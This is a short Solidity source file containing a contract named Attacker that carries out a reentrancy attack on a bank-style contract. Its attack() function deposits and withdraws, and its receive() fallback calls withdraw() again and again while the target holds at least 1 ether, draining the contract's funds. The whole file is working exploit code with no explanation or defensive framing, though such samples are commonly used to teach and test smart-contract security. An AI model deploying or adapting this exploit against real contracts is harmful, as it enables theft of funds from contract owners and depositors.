// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IBank public immutable bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function attack() external payable {
        bank.deposit{ value: msg.value }();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}
